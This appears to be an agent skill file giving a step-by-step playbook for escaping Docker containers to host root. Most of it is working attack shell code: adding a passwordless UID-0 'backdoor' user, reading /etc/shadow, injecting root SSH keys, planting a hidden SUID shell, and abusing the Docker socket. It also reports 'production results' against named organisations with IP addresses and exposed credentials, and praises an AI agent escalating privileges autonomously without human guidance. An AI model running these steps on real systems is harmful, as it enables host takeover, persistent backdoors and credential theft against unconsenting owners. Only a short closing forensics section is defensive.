---
name: docker-privesc
description: Escape Docker containers to host root via 5 techniques.
version: 1.0.0
author: agentiko
license: MIT
platforms: [linux]
compatibility: Requires agentiko worker (curl, nmap, python3)
disable-model-invocation: true
metadata:
  hermes:
    tags: [infra, docker, privilege-escalation, container-escape]
    category: infra
    related_skills:
      - port-service-discovery
      - api-noauth-hunt
---

# Docker Privilege Escalation Skill

Docker container escape and privilege escalation — Docker socket abuse, volume mount host takeover, docker group root-equivalence, and prior-privilege-escalation detection. Docker group membership = instant root on the host via 5 distinct techniques. Confirmed on Smart Fit (Docker containers extracted, 12 image layers, privileged mode) and CGE-RJ (Dockerfile + docker-compose.prod.yml exposed in GitLab).

## When to Use

- You have shell access to a Docker container (via webshell, SSH, or API exploit).
- `id` shows you're in the `docker` group or have access to `/var/run/docker.sock`.
- `docker ps` or `docker info` works from within the container.
- After `api-noauth-hunt` or `wordpress-full-compromise` achieves RCE in a container.
- Docker socket is mounted at `/var/run/docker.sock` (check: `ls -la /var/run/docker.sock`).

## Prerequisites

- Shell access inside a Docker container (any user).
- Docker socket mounted OR docker group membership OR `--privileged` flag.
- Target: escalate to host root.

## How to Run

```bash
# Check docker group membership
id | grep docker && echo "[+] Docker group — instant root possible"

# Check docker socket
ls -la /var/run/docker.sock 2>/dev/null && echo "[+] Docker socket mounted — host escape"

# Check privileged mode
cat /proc/self/status | grep -i "seccomp\|cap" && echo "[*] Check capabilities"
```

## Quick Reference

| Condition | Escape Method | Command |
|-----------|--------------|---------|
| Docker group | Volume mount host `/` | `docker run --rm -v /:/host -it alpine chroot /host` |
| Docker socket | Create privileged container | `docker run --rm --privileged -v /:/host -it alpine` |
| `--privileged` | Direct host filesystem access | `mount /dev/sda1 /mnt && chroot /mnt` |
| `SYS_ADMIN` cap | cgroup release_agent | Write to cgroup notify_on_release |
| No docker, no caps | Check for mounted sockets/pipes | `find / -type s 2>/dev/null` |

## Procedure

### Phase 1 — Assess Container Escape Surface

```bash
echo "[*] Container escape surface assessment"

# 1. Docker group
echo -n "  Docker group: "
if id | grep -q docker; then
  echo "YES — instant root via volume mount"
else
  echo "no"
fi

# 2. Docker socket
echo -n "  Docker socket: "
if ls -la /var/run/docker.sock 2>/dev/null; then
  echo "YES — host escape via docker command"
  SOCKET_PERMS=$(stat -c "%a %U:%G" /var/run/docker.sock 2>/dev/null)
  echo "  Permissions: $SOCKET_PERMS"
else
  echo "no"
fi

# 3. Privileged mode
echo -n "  Privileged: "
if ip link add dummy0 type dummy 2>/dev/null; then
  echo "YES — privileged container"
  ip link delete dummy0 2>/dev/null
else
  echo "no"
fi

# 4. Capabilities
echo "  Capabilities:"
grep CapEff /proc/self/status 2>/dev/null

# 5. Mounted volumes (potential host paths)
echo "  Mounted volumes:"
mount | grep -vE "^(overlay|tmpfs|proc|sys|devpts|cgroup)" | head -10

# 6. Host processes visible?
echo -n "  Host processes: "
PROC_COUNT=$(ls /proc | grep -c '^[0-9]' 2>/dev/null)
echo "$PROC_COUNT visible"
```

### Phase 2 — Docker Group → Host Root (5 techniques)

```bash
echo "[*] Docker group privesc"

# Technique 1: Volume mount + add user with UID 0
echo "[1] Adding user with UID 0 to /etc/passwd"
docker run --rm -v /etc:/host_etc alpine sh -c \
  'echo "backdoor::0:0::/root:/bin/bash" >> /host_etc/passwd'
su backdoor 2>/dev/null

# Technique 2: Volume mount + read shadow
echo "[2] Reading /etc/shadow"
docker run --rm -v /etc:/host_etc alpine cat /host_etc/shadow 2>/dev/null | head -5

# Technique 3: chroot to host root
echo "[3] Chroot to host root"
docker run --rm -v /:/host -it alpine chroot /host bash -c "id && hostname"

# Technique 4: Inject SSH key
echo "[4] Injecting SSH key to host root"
docker run --rm -v /root:/host_root alpine sh -c \
  'mkdir -p /host_root/.ssh && echo "YOUR_SSH_PUB_KEY" >> /host_root/.ssh/authorized_keys'

# Technique 5: Create SUID bash on host
echo "[5] Creating SUID bash on host"
docker run --rm -v /usr/local/bin:/host_bin alpine sh -c \
  'cp /bin/sh /host_bin/.backdoor && chmod u+s /host_bin/.backdoor'
/usr/local/bin/.backdoor -p 2>/dev/null
```

### Phase 3 — Docker Socket → Host Root

```bash
echo "[*] Docker socket exploitation"

# If docker client is available in the container
if command -v docker &>/dev/null; then
  echo "[+] Docker client available"

  # Create privileged container with host root mounted
  docker run --rm --privileged --pid=host -v /:/host alpine sh -c \
    "chroot /host bash -c 'id && hostname'"

  # Alternative: just exec into an existing host container
  docker ps  # List running containers
  docker exec -it <container_id> /bin/bash
fi

# If docker client is NOT available, install it or use the socket directly
if [[ ! -f /usr/bin/docker ]] && [[ -S /var/run/docker.sock ]]; then
  echo "[*] No docker client — using REST API via socket"
  curl -sk --unix-socket /var/run/docker.sock http://localhost/containers/json | head -20
fi
```

### Phase 4 — Detect Prior Privilege Escalation (forensics)

```bash
echo "[*] Checking for prior privilege escalation on host"

# Check sudoers for NOPASSWD entries (docker privesc technique)
echo "  NOPASSWD sudoers:"
grep -r "NOPASSWD" /etc/sudoers /etc/sudoers.d/ 2>/dev/null | head -5

# Check for users with UID 0 (injected via /etc/passwd technique)
echo "  UID 0 users:"
awk -F: '$3 == 0 {print $1}' /etc/passwd 2>/dev/null

# Check for newly created authorized_keys files
echo "  Root SSH keys:"
ls -la /root/.ssh/authorized_keys 2>/dev/null
stat /root/.ssh/authorized_keys 2>/dev/null | grep Modify

# Check for SUID binaries
echo "  New SUID binaries:"
find / -perm -4000 -type f 2>/dev/null | while read f; do
  if stat "$f" 2>/dev/null | grep -q "Change:.*2026"; then
    echo "    $f (recently modified)"
  fi
done
```

## Real Production Results

### Smart Fit — Docker Container Extraction
- 12 Docker image layers extracted from `.git` exposed repository
- Docker containers running on OVH infrastructure (51.222.42.163)
- `.env` exposed with MySQL, Redis, SendGrid, OVH S3 credentials
- 21 credentials for rotation across 5 Firebase projects + OVH + AWS

### CGE-RJ — Docker Compose in GitLab
- `docker-compose.prod.yml` exposed in public GitLab repository
- Blue/green deployment architecture mapped
- Internal IP 10.11.82.75 discovered in deploy scripts

### AI Agent Automated Docker Privesc (from TECNICAS_DOCKER_PRIVESC.md)
- Claude Code autonomously discovered docker group membership
- Checked docker binary, identified volume-mount-to-root technique
- Executed automatic privesc without human guidance
- Mitigation: rootless mode, no docker group, Podman, security-opt no-new-privileges

## Pitfalls

- **Not all containers have docker socket.** It's mounted deliberately by the ops team. Most containers don't have it.
- **Container may not have docker binary.** Install it: `apt-get update && apt-get install -y docker.io` (if internet access).
- **Restricted capabilities.** `--privileged` is rare. Check `CapEff` mask to see what's available.
- **AppArmor/SELinux may block actions.** Even with docker socket, SELinux may prevent the escape.
- **Security-opt no-new-privileges.** Blocks SUID binaries and setuid() syscalls.

## Verification

- Docker group privesc: MUST be able to read `/etc/shadow` from host via volume mount.
- Docker socket: MUST be able to create a new privileged container and execute commands on the host.
- Privileged mode: MUST be able to mount host filesystem and chroot.
- Prior privesc: MUST identify at least one indicator (NOPASSWD sudo, UID 0 anomalies, new SSH keys, SUID binaries).
- Document: container privileges, escape method used, and host root access achieved.
